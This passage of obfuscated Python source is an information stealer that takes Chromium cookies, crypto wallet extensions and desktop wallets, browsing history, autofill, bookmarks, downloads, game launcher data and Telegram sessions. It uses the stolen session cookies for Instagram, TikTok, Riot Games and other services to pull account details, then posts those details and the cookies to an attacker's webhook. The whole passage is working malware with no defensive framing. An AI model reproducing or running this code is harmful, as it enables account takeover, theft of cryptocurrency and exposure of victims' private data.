                O00O0OO0OO000O0OO =SubModules .GetKey (os .path .join (O0OOO00OOO00O00O0 ,"Local State"))#line:451
                O0O00OO00O0O0OO0O =os .path .join (O00O000O0O0O00OO0 ,"Network","Cookies")#line:452
                OO00OO0O0OOOO00O0 =os .path .join (O0OO0O0O00OOO0O0O .Temp ,"Cookies.db")#line:453
                try :#line:454
                    shutil .copyfile (O0O00OO00O0O0OO0O ,OO00OO0O0OOOO00O0 )#line:455
                except :#line:456
                    pass #line:457
                O0O00OO0OOOOOOOO0 =sqlite3 .connect (OO00OO0O0OOOO00O0 )#line:458
                O0O000OOOO000OOO0 =O0O00OO0OOOOOOOO0 .cursor ()#line:459
                O0O000OOOO000OOO0 .execute ('select host_key, name, path, encrypted_value,expires_utc from cookies')#line:460
                O0OOOOO0000O0O0OO =O0O000OOOO000OOO0 .fetchall ()#line:461
                try :#line:462
                    O0O000OOOO000OOO0 .close ()#line:463
                    O0O00OO0OOOOOOOO0 .close ()#line:464
                    os .remove (OO00OO0O0OOOO00O0 )#line:465
                except :pass #line:466
                OO000O0O00OOO0000 =None #line:467
                OO0000O0OO000OO00 =None #line:468
                for O0O0O0O000O00OOO0 in O0OOOOO0000O0O0OO :#line:469
                    OO00O0O00000O00O0 =SubModules .Decrpytion (O0O0O0O000O00OOO0 [3 ],O00O0OO0OO000O0OO )#line:470
                    Variables .Cookies .append (f"{O0O0O0O000O00OOO0[0]}\t{'FALSE' if O0O0O0O000O00OOO0[4] == 0 else 'TRUE'}\t{O0O0O0O000O00OOO0[2]}\t{'FALSE' if O0O0O0O000O00OOO0[0].startswith('.') else 'TRUE'}\t{O0O0O0O000O00OOO0[4]}\t{O0O0O0O000O00OOO0[1]}\t{OO00O0O00000O00O0}\n")#line:471
                    if "instagram"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and "sessionid"in str (O0O0O0O000O00OOO0 [1 ]).lower ():#line:472
                        asyncio .create_task (O0OO0O0O00OOO0O0O .InstaSession (OO00O0O00000O00O0 ,OOO00OOOO00O0O0OO ))#line:473
                    if "tiktok"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and str (O0O0O0O000O00OOO0 [1 ])=="sessionid":#line:474
                        asyncio .create_task (O0OO0O0O00OOO0O0O .TikTokSession (OO00O0O00000O00O0 ,OOO00OOOO00O0O0OO ))#line:475
                    if "twitter"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and str (O0O0O0O000O00OOO0 [1 ])=="auth_token":#line:476
                        asyncio .create_task (O0OO0O0O00OOO0O0O .TwitterSession (OO00O0O00000O00O0 ,OOO00OOOO00O0O0OO ))#line:477
                    if "reddit"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and "reddit_session"in str (O0O0O0O000O00OOO0 [1 ]).lower ():#line:478
                        asyncio .create_task (O0OO0O0O00OOO0O0O .RedditSession (OO00O0O00000O00O0 ,OOO00OOOO00O0O0OO ))#line:479
                    if "spotify"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and "sp_dc"in str (O0O0O0O000O00OOO0 [1 ]).lower ():#line:480
                        asyncio .create_task (O0OO0O0O00OOO0O0O .SpotifySession (OO00O0O00000O00O0 ,OOO00OOOO00O0O0OO ))#line:481
                    if "roblox"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and "ROBLOSECURITY"in str (O0O0O0O000O00OOO0 [1 ]):#line:482
                        asyncio .create_task (O0OO0O0O00OOO0O0O .RobloxSession (OO00O0O00000O00O0 ,OOO00OOOO00O0O0OO ))#line:483
                    if "twitch"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and "auth-token"in str (O0O0O0O000O00OOO0 [1 ]).lower ():#line:484
                        OO0000O0OO000OO00 =OO00O0O00000O00O0 #line:485
                    if "twitch"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and str (O0O0O0O000O00OOO0 [1 ]).lower ()=="login":#line:486
                        OO000O0O00OOO0000 =OO00O0O00000O00O0 #line:487
                    if not OO000O0O00OOO0000 ==None and not OO0000O0OO000OO00 ==None :#line:488
                        asyncio .create_task (O0OO0O0O00OOO0O0O .TwitchSession (OO0000O0OO000OO00 ,OO000O0O00OOO0000 ,OOO00OOOO00O0O0OO ))#line:489
                        OO000O0O00OOO0000 =None #line:490
                        OO0000O0OO000OO00 =None #line:491
                    if "account.riotgames.com"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and "sid"in str (O0O0O0O000O00OOO0 [1 ]).lower ():#line:492
                        asyncio .create_task (O0OO0O0O00OOO0O0O .RiotGamesSession (OO00O0O00000O00O0 ,OOO00OOOO00O0O0OO ))#line:493
        except :#line:494
            pass #line:495
    async def GetWallets (O0OOOO00000OOOO0O ,O0O0OOO00OO0O0O0O :str )->None :#line:496
        try :#line:497
            OO0O0OO000O00O0OO ={"MetaMask":"nkbihfbeogaeaoehlefnkodbefgpgknn","Binance":"fhbohimaelbohpjbbldcngcnapndodjp","Phantom":"bfnaelmomeimhlpmgjnjophhpkkoljpa","Coinbase":"hnfanknocfeofbddgcijnmhnfnkdnaad","Ronin":"fnjhmkhhmkbjkkabndcnnogagogbneec","Exodus":"aholpfdialjgjfhomihkjbmgjidlcdno","Coin98":"aeachknmefphepccionboohckonoeemg","KardiaChain":"pdadjkfkgcafgbceimcpbkalnfnepbnk","TerraStation":"aiifbnbfobpmeekipheeijimdpnlpgpp","Wombat":"amkmjjmmflddogmhpjloimipbofnfjih","Harmony":"fnnegphlobjdpkhecapkijjdkgcjhkib","Nami":"lpfcbjknijpeeillifnkikgncikgfhdo","MartianAptos":"efbglgofoippbgcjepnhiblaibcnclgk","Braavos":"jnlgamecbpmbajjfhmmmlhejkemejdma","XDEFI":"hmeobnfnfcmdkdcmlblgagmfpfboieaf","Yoroi":"ffnbelfdoeiohenkjibnmadjiehjhajb","TON":"nphplpgoakhhjchkkhmiggakijnkhfnd","Authenticator":"bhghoamapcdpbohphigoooaddinpkbai","MetaMask_Edge":"ejbalbakoplchlghecdalmeeeajnimhm","Tron":"ibnejdfjmmkpcnlpebklmnkoeoihofec",}#line:518
            O00OO0O0O000O00OO ={"Bitcoin":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Bitcoin","wallets"),"Zcash":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Zcash"),"Armory":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Armory"),"Bytecoin":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"bytecoin"),"Jaxx":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"com.liberty.jaxx","IndexedDB","file__0.indexeddb.leveldb"),"Exodus":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Exodus","exodus.wallet"),"Ethereum":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Ethereum","keystore"),"Electrum":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Electrum","wallets"),"AtomicWallet":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"atomic","Local Storage","leveldb"),"Guarda":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Guarda","Local Storage","leveldb"),"Coinomi":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Coinomi","Coinomi","wallets"),}#line:531
            os .mkdir (os .path .join (O0O0OOO00OO0O0O0O ,"Wallets"))#line:532
            for O0OO0OO0OOOOOOOOO in O0OOOO00000OOOO0O .profiles_full_path :#line:533
                O0O0OOOOOO00O0000 =os .path .join (O0OO0OO0OOOOOOOOO ,"Local Extension Settings")#line:534
                if os .path .exists (O0O0OOOOOO00O0000 ):#line:535
                    for O00OO00000OOOO0OO ,O0O0O0000OOOOO00O in OO0O0OO000O00O0OO .items ():#line:536
                        if os .path .isdir (os .path .join (O0O0OOOOOO00O0000 ,O0O0O0000OOOOO00O )):#line:537
                            try :#line:538
                                O00OO0OOOO00000OO =os .path .join (O0O0OOOOOO00O0000 ,O0O0O0000OOOOO00O ).split ("\\")#line:539
                                O0O0000O0OOOO0O00 =f"{O00OO0OOOO00000OO[5]} {O00OO0OOOO00000OO[6]} {O00OO0OOOO00000OO[8]} {O00OO00000OOOO0OO}"#line:540
                                os .makedirs (O0O0OOO00OO0O0O0O +"\\Wallets\\"+O0O0000O0OOOO0O00 )#line:541
                                shutil .copytree (os .path .join (O0O0OOOOOO00O0000 ,O0O0O0000OOOOO00O ),os .path .join (O0O0OOO00OO0O0O0O ,"Wallets",O0O0000O0OOOO0O00 ,O0O0O0000OOOOO00O ))#line:542
                            except :#line:543
                                continue #line:544
            for O00O0OO0OOOO0O0OO ,OOO00O0O0000O0OO0 in O00OO0O0O000O00OO .items ():#line:545
                try :#line:546
                    if os .path .exists (OOO00O0O0000O0OO0 ):#line:547
                        shutil .copytree (OOO00O0O0000O0OO0 ,os .path .join (O0O0OOO00OO0O0O0O ,"Wallets",O00O0OO0OOOO0O0OO ))#line:548
                except :continue #line:549
        except :#line:550
            pass #line:551
    async def GetHistory (O0OO0O00OOO0O00OO )->None :#line:552
        try :#line:553
            for O0O0OOOO0OOOOOOO0 in O0OO0O00OOO0O00OO .profiles_full_path :#line:554
                O00OOO0O0OOOOO0O0 =os .path .join (O0O0OOOO0OOOOOOO0 ,"History")#line:555
                OOOOOO0OO0O0OO0O0 =os .path .join (O0OO0O00OOO0O00OO .Temp ,"HistoryData.db")#line:556
                shutil .copyfile (O00OOO0O0OOOOO0O0 ,OOOOOO0OO0O0OO0O0 )#line:557
                OO0000OO0O00OO00O =sqlite3 .connect (OOOOOO0OO0O0OO0O0 )#line:558
                O00000O000000OO00 =OO0000OO0O00OO00O .cursor ()#line:559
                O00000O000000OO00 .execute ('select id, url, title, visit_count, last_visit_time from urls')#line:560
                O000O000OOO0O000O =O00000O000000OO00 .fetchall ()#line:561
                try :#line:562
                    O00000O000000OO00 .close ()#line:563
                    OO0000OO0O00OO00O .close ()#line:564
                    os .remove (OOOOOO0OO0O0OO0O0 )#line:565
                except :pass #line:566
                for OO0OO00000O0OOOO0 in O000O000OOO0O000O :#line:567
                    Variables .Historys .append (f"ID : {OO0OO00000O0OOOO0[0]}\nURL : {OO0OO00000O0OOOO0[1]}\nitle : {OO0OO00000O0OOOO0[2]}\nVisit Count : {OO0OO00000O0OOOO0[3]}\nLast Visit Time {OO0OO00000O0OOOO0[4]}\n====================================================================================\n")#line:568
        except :#line:569
            pass #line:570
    async def GetAutoFill (OOO0O0OOO0O0OOO0O )->None :#line:572
        try :#line:573
            for O0OOOO000O000000O in OOO0O0OOO0O0OOO0O .profiles_full_path :#line:574
                O000OO0O0O0000OOO =os .path .join (O0OOOO000O000000O ,"Web Data")#line:575
                OOOOO00OO00O000OO =os .path .join (OOO0O0OOO0O0OOO0O .Temp ,"AutofillData.db")#line:576
                shutil .copyfile (O000OO0O0O0000OOO ,OOOOO00OO00O000OO )#line:577
                O0O0000OOO0OO0OOO =sqlite3 .connect (OOOOO00OO00O000OO )#line:578
                O0000O00O0O0O0O00 =O0O0000OOO0OO0OOO .cursor ()#line:579
                O0000O00O0O0O0O00 .execute ('select * from autofill')#line:580
                OOOOO0OO0000000O0 =O0000O00O0O0O0O00 .fetchall ()#line:581
                try :#line:582
                    O0000O00O0O0O0O00 .close ()#line:583
                    O0O0000OOO0OO0OOO .close ()#line:584
                    os .remove (OOOOO00OO00O000OO )#line:585
                except :pass #line:586
                for O0O00OO0OO00OO0OO in OOOOO0OO0000000O0 :#line:587
                    if O0O00OO0OO00OO0OO :#line:588
                        Variables .Autofills .append (f"{O0O00OO0OO00OO0OO}\n")#line:589
        except Exception :pass #line:590
    async def GetBookMark (O000OOO0000O0O00O )->None :#line:592
        try :#line:593
            for O0OO0OO0OO00OOO00 in O000OOO0000O0O00O .profiles_full_path :#line:594
                OOOOOOO0OO0OO00OO =os .path .join (O0OO0OO0OO00OOO00 ,"Bookmarks")#line:595
                if os .path .isfile (OOOOOOO0OO0OO00OO ):#line:596
                    with open (OOOOOOO0OO0OO00OO ,"r",encoding ="utf-8",errors ="ignore")as O0O00OOO000OO0OO0 :#line:597
                        OOOO0OO000OO0O000 =json .load (O0O00OOO000OO0OO0 )#line:598
                    OOOO0OO000OO0O000 =OOOO0OO000OO0O000 ["roots"]["bookmark_bar"]["children"]#line:599
                    if OOOO0OO000OO0O000 :#line:600
                        Variables .Bookmarks .append (f"Browser Path : {O0OO0OO0OO00OOO00}\nID : {OOOO0OO000OO0O000['id']}\nName : {OOOO0OO000OO0O000['name']}\nURL : {OOOO0OO000OO0O000['url']}\nGUID : {OOOO0OO000OO0O000['guid']}\nAdded At : {OOOO0OO000OO0O000['date_added']}\n\n=========================================================")#line:601
        except :#line:602
            pass #line:603
    async def GetDownload (OOOOOOO00OO000OO0 )->None :#line:604
        try :#line:605
            for OOO000OOOOOO0O000 in OOOOOOO00OO000OO0 .profiles_full_path :#line:606
                OO000OOOO0OOOOOOO =os .path .join (OOO000OOOOOO0O000 ,"History")#line:607
                O00OOO0O00000O00O =os .path .join (OOOOOOO00OO000OO0 .Temp ,"DownloadData.db")#line:608
                shutil .copyfile (OO000OOOO0OOOOOOO ,O00OOO0O00000O00O )#line:609
                OOO00000O000OOO00 =sqlite3 .connect (O00OOO0O00000O00O )#line:610
                OO00OOO0OO0OO000O =OOO00000O000OOO00 .cursor ()#line:611
                OO00OOO0OO0OO000O .execute ('select tab_url, target_path from downloads')#line:612
                OO000000O0OO0000O =OO00OOO0OO0OO000O .fetchall ()#line:613
                try :#line:614
                    OO00OOO0OO0OO000O .close ()#line:615
                    OOO00000O000OOO00 .close ()#line:616
                    os .remove (O00OOO0O00000O00O )#line:617
                except :pass #line:618
                for OO000O00O0O0OOOOO in OO000000O0OO0000O :#line:619
                    Variables .Downloads .append (f"Downloaded URL: {OO000O00O0O0OOOOO[0]}\nDownloaded Path: {OO000O00O0O0OOOOO[1]}\n\n")#line:620
        except :#line:621
            pass #line:622
    async def StealUplay (OO00OOOO0O0OOOO0O ,O0O000000OO00O00O :str )->None :#line:623
        try :#line:624
            OOOOOO0000OOOOO00 =False #line:625
            OOOOO000O00OO0000 =os .path .join (OO00OOOO0O0OOOO0O .LocalAppData ,"Ubisoft Game Launcher")#line:626
            O0O00O000O00O000O =os .path .join (OO00OOOO0O0OOOO0O .Temp ,O0O000000OO00O00O ,"Games","Uplay")#line:627
            if os .path .isdir (OOOOO000O00OO0000 ):#line:628
                if not os .path .exists (O0O00O000O00O000O ):#line:629
                    os .mkdir (O0O00O000O00O000O )#line:630
                for O0O00OOOO0O00OOOO in os .listdir (OOOOO000O00OO0000 ):#line:631
                    O0O0000OO0OOOO0OO =os .path .join (OOOOO000O00OO0000 ,O0O00OOOO0O00OOOO )#line:632
                    try :#line:633
                        shutil .copy (O0O0000OO0OOOO0OO ,os .path .join (O0O00O000O00O000O ,O0O00OOOO0O00OOOO ))#line:634
                        OOOOOO0000OOOOO00 =True #line:635
                    except :#line:636
                        continue #line:637
        except :#line:638
            pass #line:639
    async def StealEpicGames (O0000OO0O0OOO0000 ,OOOO0OO0O0OOOO0O0 :str )->None :#line:640
        try :#line:641
            O00OO0OOOO0OO0OO0 =False #line:642
            O00OO0OO0OOO0O00O =os .path .join (O0000OO0O0OOO0000 .LocalAppData ,"EpicGamesLauncher","Saved","Config","Windows")#line:643
            OO00OOOO00O0OO0O0 =os .path .join (O0000OO0O0OOO0000 .Temp ,OOOO0OO0O0OOOO0O0 ,"Games","Epic Games")#line:644
            if os .path .isdir (O00OO0OO0OOO0O00O ):#line:645
                if not os .path .exists (OO00OOOO00O0OO0O0 ):#line:646
                    os .mkdir (OO00OOOO00O0OO0O0 )#line:647
                try :#line:648
                    shutil .copytree (O00OO0OO0OOO0O00O ,os .path .join (OO00OOOO00O0OO0O0 ,"Windows"))#line:649
                    O00OO0OOOO0OO0OO0 =True #line:650
                except :#line:651
                    pass #line:652
        except Exception :#line:653
            pass #line:654
    async def StealGrowtopia (O00O000OO0O0OO000 ,OOO00OOO0OOO00O00 :str )->None :#line:655
        try :#line:656
            O0O0O00OO0OOO00O0 =False #line:657
            O000000O000O0O0O0 =os .path .join (O00O000OO0O0OO000 .LocalAppData ,"Growtopia","save.dat")#line:658
            O0OOO0O0OO00OOOO0 =os .path .join (O00O000OO0O0OO000 .Temp ,OOO00OOO0OOO00O00 ,"Games","Growtopia")#line:659
            if os .path .isfile (O000000O000O0O0O0 ):#line:660
                O0O0O00OO0OOO00O0 =True #line:661
                shutil .copy (O000000O000O0O0O0 ,os .path .join (O0OOO0O0OO00OOOO0 ,"save.dat"))#line:662
        except :#line:663
            pass #line:664
    async def StealTelegramSession (O0O000O0O0OO0O00O ,OO00OO00OO00O00O0 :str )->None :#line:665
        try :#line:666
            O0OO0000OO00OOOO0 =False #line:667
            OO0000O0O00O0O000 =os .path .join (O0O000O0O0OO0O00O .RoamingAppData ,"Telegram Desktop","tdata")#line:668
            if os .path .exists (OO0000O0O00O0O000 ):#line:669
                OO0OOOO0O0O00O0O0 =os .path .join (OO00OO00OO00O00O0 ,"Telegram Session")#line:670
                OOO0O00OOOOOOO000 =["dumps","emojis","user_data","working","emoji","tdummy","user_data#2","user_data#3","user_data#4","user_data#5"]#line:671
                OO0OOO000O0OOO0OO =await asyncio .create_subprocess_shell (f"taskkill /F /IM Telegram.exe",shell =True ,stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE )#line:672
                await OO0OOO000O0OOO0OO .communicate ()#line:673
                if not os .path .exists (OO0OOOO0O0O00O0O0 ):#line:674
                    os .mkdir (OO0OOOO0O0O00O0O0 )#line:675
                for O0O0O0O0000OO000O in os .listdir (OO0000O0O00O0O000 ):#line:676
                    try :#line:677
                        _O0O0OO000OO0OO0O0 =os .path .join (OO0000O0O00O0O000 ,O0O0O0O0000OO000O )#line:678
                        if not O0O0O0O0000OO000O in OOO0O00OOOOOOO000 :#line:679
                            OO000O00O0O0OOO00 =_O0O0OO000OO0OO0O0 .split ("\\")[7 ]#line:680
                            if os .path .isfile (_O0O0OO000OO0OO0O0 ):#line:681
                                shutil .copyfile (_O0O0OO000OO0OO0O0 ,os .path .join (OO0OOOO0O0O00O0O0 ,OO000O00O0O0OOO00 ))#line:682
                            elif os .path .isdir (_O0O0OO000OO0OO0O0 ):#line:683
                                shutil .copytree (_O0O0OO000OO0OO0O0 ,os .path .join (OO0OOOO0O0O00O0O0 ,OO000O00O0O0OOO00 ))#line:684
                            O0OO0000OO00OOOO0 =True #line:685
                    except :continue #line:686
        except :#line:687
            pass #line:688
    async def RiotGamesSession (O00OO0OO00000000O ,OOOO0OOO0OO0O0O00 ,OOOO0O0000OOOO0OO :str )->None :#line:689
        try :#line:690
            OO0O0O0O0OO000OOO =aiohttp .TCPConnector (ssl =True )#line:691
            async with aiohttp .ClientSession (connector =OO0O0O0O0OO000OOO )as OO00O0O0O0O000000 :#line:692
                async with OO00O0O0O0O000000 .get ('https://account.riotgames.com/api/account/v1/user',headers ={"Cookie":f"sid={OOOO0OOO0OO0O0O00}"})as O000O0OOO000O0000 :#line:693
                    OO000O0O0OO00OOOO =await O000O0OOO000O0000 .json ()#line:694
                O000OOOOOOO00OO00 ={"title":"***Shit***","description":f"***Riot Games Session was detected on the {OOOO0O0000OOOO0OO} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":"Shit"}}#line:701
                O0000OOO0OOOO0000 =str (OO000O0O0OO00OOOO ["username"])#line:702
                O0O0000O0O0O0O00O =str (OO000O0O0OO00OOOO ["email"])#line:703
                O0OO0OO0OOO0OO00O =str (OO000O0O0OO00OOOO ["region"])#line:704
                OO000OOOO000O0OOO =str (OO000O0O0OO00OOOO ["locale"])#line:705
                O000O0OO0OOOO000O =str (OO000O0O0OO00OOOO ["country"])#line:706
                OOO00O0OO000OO0O0 =str (OO000O0O0OO00OOOO ["mfa"]["verified"])#line:707
                OO0O000OOOOOOOOO0 =[{"name":"Username","value":"``"+O0000OOO0OOOO0000 +"``","inline":True },{"name":"Email","value":"``"+O0O0000O0O0O0O00O +"``","inline":True },{"name":"Region","value":"``"+O0OO0OO0OOO0OO00O +"``","inline":True },{"name":"Locale","value":"``"+OO000OOOO000O0OOO +"``","inline":True },{"name":"Country","value":"``"+O000O0OO0OOOO000O +"``","inline":True },{"name":"MFA Enabled?","value":"``"+OOO00O0OO000OO0O0 +"``","inline":True },{"name":"Cookie","value":"``"+OOOO0OOO0OO0O0O00 +"``","inline":False },]#line:715
                O000OOOOOOO00OO00 ["fields"]=OO0O000OOOOOOOOO0 #line:716
                O0OOOOOO0O00OOOO0 ={"username":"Shit","embeds":[O000OOOOOOO00OO00 ]}#line:720
                OO0OOOO0O00OOO00O ={"Content-Type":"application/json"}#line:723
                async with OO00O0O0O0O000000 .post (webhook ,json =O0OOOOOO0O00OOOO0 ,headers =OO0OOOO0O00OOO00O )as OO000O0O0OO00OOOO :#line:724
                    pass #line:725
        except :#line:726
            pass #line:727
        else :#line:728
            Variables .RiotGameAccounts .append (f'Username : {O0000OOO0OOOO0000}\nEmail : {O0O0000O0O0O0O00O}\nRegion : {O0OO0OO0OOO0OO00O}\nLocale : {OO000OOOO000O0OOO}\nCountry : {O000O0OO0OOOO000O}\nMFA Enabled : {OOO00O0OO000OO0O0}\nCookie : {OOOO0OOO0OO0O0O00}\n======================================================================\n')#line:729
    async def InstaSession (OOOOOO00OOO000O00 ,OO00OOOOO00O0OOO0 ,O00OOOOOO0O00O000 :str )->None :#line:730
        try :#line:731
            O0O0O0O00000O0OOO ="Shit"#line:732
            O0OOOOO0000000O0O =""#line:733
            OOOO0OOOO0O0OO00O =""#line:734
            OOOOOO0O0000OO000 ={"user-agent":"Instagram 219.0.0.12.117 Android","cookie":f"sessionid={OO00OOOOO00O0OOO0}"}#line:738
            OO0OOO0O00000O0OO ='https://i.instagram.com/api/v1/accounts/current_user/?edit=true'#line:739
            async with aiohttp .ClientSession (headers =OOOOOO0O0000OO000 ,connector =aiohttp .TCPConnector (ssl =True ))as O00OOO0000O0O0000 :#line:741
                async with O00OOO0000O0O0000 .get (OO0OOO0O00000O0OO )as OO0OO000O00O0O00O :#line:742
                    OO0OO000O0OO0OOO0 =await OO0OO000O00O0O00O .json ()#line:743
                async with O00OOO0000O0O0000 .get (f"https://i.instagram.com/api/v1/users/{OO0OO000O0OO0OOO0['user']['pk']}/info/")as OO0OO000O00O0O00O :#line:744
                    O00O0OOOOOOO00O00 =await OO0OO000O00O0O00O .json ()#line:745
            try :#line:747
                O0O0O0O00000O0OOO =OO0OO000O0OO0OOO0 ["user"]["profile_pic_url"]#line:748
            except :#line:749
                pass #line:750
            O0OOOO00000O0OOOO =OO0OO000O0OO0OOO0 ["user"]["username"]#line:752
            OOO00O0O0O0O00OOO ="https://instagram.com/"+O0OOOO00000O0OOOO #line:753
            if OO0OO000O0OO0OOO0 ["user"]["biography"]=="":#line:755
                O0OOOOO0000000O0O ="No bio"#line:756
            else :#line:757
                O0OOOOO0000000O0O =OO0OO000O0OO0OOO0 ["user"]["biography"]#line:758
            O0OOOOO0000000O0O =O0OOOOO0000000O0O .replace ("\n",", ")#line:759
            if OO0OO000O0OO0OOO0 ["user"]["full_name"]=="":#line:760
                OOOO0OOOO0O0OO00O ="No nickname"#line:761
            else :#line:762
                OOOO0OOOO0O0OO00O =OO0OO000O0OO0OOO0 ["user"]["full_name"]#line:763
            OO0O0OOOOO0OOO0O0 =OO0OO000O0OO0OOO0 ["user"]["email"]#line:765
            O0OO0O0OO00OO0OOO =OO0OO000O0OO0OOO0 ["user"]["is_verified"]#line:766
            OOOO0OO0O0OO0O000 =O00O0OOOOOOO00O00 ["user"]["follower_count"]#line:767
            OOO0OOO00O00O00OO =O00O0OOOOOOO00O00 ["user"]["following_count"]#line:768
            O00OOO0OO0O0O00O0 ={"title":"***Shit***","description":f"**Instagram Session was detected on the {O00OOOOOO0O00O000} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":O0O0O0O00000O0OOO }}#line:775
            OO0OOO00O000O0OOO =[{"name":"Username","value":"``"+O0OOOO00000O0OOOO +"``","inline":True },{"name":"Nick Name","value":"``"+OOOO0OOOO0O0OO00O +"``","inline":True },{"name":"Email","value":"``"+OO0O0OOOOO0OOO0O0 +"``","inline":True },{"name":"is Verified","value":"``"+str (O0OO0O0OO00OO0OOO )+"``","inline":True },{"name":"Followers","value":"``"+str (OOOO0OO0O0OO0O000 )+"``","inline":True },{"name":"Following","value":"``"+str (OOO0OOO00O00O00OO )+"``","inline":True },{"name":"Profile URL","value":"``"+OOO00O0O0O0O00OOO +"``","inline":False },{"name":"Biography","value":"``"+O0OOOOO0000000O0O +"``","inline":False },{"name":"Cookie","value":"``"+OO00OOOOO00O0OOO0 +"``","inline":False },]#line:785
            O00OOO0OO0O0O00O0 ["fields"]=OO0OOO00O000O0OOO #line:786
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as O00OOO0000O0O0000 :#line:787
                O0000O000OO000OO0 ={"username":"Shit","embeds":[O00OOO0OO0O0O00O0 ]}#line:791
                OOOOOO0O0000OO000 ={"Content-Type":"application/json"}#line:794
                async with O00OOO0000O0O0000 .post (webhook ,json =O0000O000OO000OO0 ,headers =OOOOOO0O0000OO000 )as OO0OO000O00O0O00O :#line:795
                    pass #line:796
        except Exception :#line:798
            pass #line:799
        else :#line:800
            Variables .InstagramAccounts .append (f"Cookie : {OO00OOOOO00O0OOO0}\nProfile URL : {OOO00O0O0O0O00OOO}\nUsername : {O0OOOO00000O0OOOO}\nNick Name : {OOOO0OOOO0O0OO00O}\nis Verified : {O0OO0O0OO00OO0OOO}\nEmail : {OO0O0OOOOO0OOO0O0}\nFollowers : {OOOO0OO0O0OO0O000}\nFollowing : {OOO0OOO00O00O00OO}\nBiography : {O0OOOOO0000000O0O}\n======================================================================\n")#line:801
    async def TikTokSession (O00000OOOO0O00OOO ,O0O0O00OOOO0000O0 ,O00OO000O0OO00OO0 :str )->None :#line:802
        try :#line:803
            OOO000OOOO000OO00 =''#line:804
            OOO0O0OO00O00000O =''#line:805
            OOOOOO0O000O00OO0 ="sessionid="+O0O0O00OOOO0000O0 #line:806
            O00O0OOO00000OOO0 ={"cookie":OOOOOO0O000O00OO0 ,"Accept-Encoding":"identity"}#line:807
            OOO0OO0OO0O0OO0OO ={"cookie":OOOOOO0O000O00OO0 }#line:808
            O0OOO0O00O00O00O0 ='https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE'#line:809
            OO0OOO00OOO0000OO ='https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true'#line:810
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OOOO00OOO0OO0000O :#line:811
                async with OOOO00OOO0OO0000O .get (O0OOO0O00O00O00O0 ,headers =O00O0OOO00000OOO0 )as O0OO000O0O00O00OO :#line:812
                    OO0O0O0O000O00OO0 =await O0OO000O0O00O00OO .json ()#line:813
                async with OOOO00OOO0OO0000O .get (OO0OOO00OOO0000OO ,headers =OOO0OO0OO0O0OO0OO )as O0O0O00O0O00000O0 :#line:814
                    OO0000OOO0OO00000 =await O0O0O00O0O00000O0 .json ()#line:815
            O0O00OOOO0OOO0O00 =OO0O0O0O000O00OO0 ["data"]["user_id"]#line:817
            if not OO0O0O0O000O00OO0 ["data"]["email"]:#line:818
                OOO000OOOO000OO00 ="No Email"#line:819
            else :#line:820
                OOO000OOOO000OO00 =OO0O0O0O000O00OO0 ["data"]["email"]#line:821
            if not OO0O0O0O000O00OO0 ["data"]["mobile"]:#line:822
                OOO0O0OO00O00000O ="No number"#line:823
            else :#line:824
                OOO0O0OO00O00000O =OO0O0O0O000O00OO0 ["data"]["mobile"]#line:825
            O00O00OO0O0O00000 =OO0O0O0O000O00OO0 ["data"]["username"]#line:826
            O00OO00000OOOO000 =OO0000OOO0OO00000 ["data"]["coins"]#line:827
            O0OO00O0O0O00OOOO ={"title":"***Shit***","description":f"***Tiktok Session was detected on the {O00OO000O0OO00OO0} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":"Shit"}}#line:835
            O0O0O0000OO0OOO0O =[{"name":"Username","value":"``"+O00O00OO0O0O00000 +"``","inline":True },{"name":"Email","value":"``"+OOO000OOOO000OO00 +"``","inline":True },{"name":"Phone","value":"``"+str (OOO0O0OO00O00000O )+"``","inline":True },{"name":"User identifier","value":"``"+str (O0O00OOOO0OOO0O00 )+"``","inline":True },{"name":"Coins","value":"``"+str (O00OO00000OOOO000 )+"``","inline":True },{"name":"Profile URL","value":"``"+f'https://tiktok.com/@{O00O00OO0O0O00000}'+"``","inline":False },{"name":"Tiktok Cookie","value":"``"+O0O0O00OOOO0000O0 +"``","inline":False },]#line:843
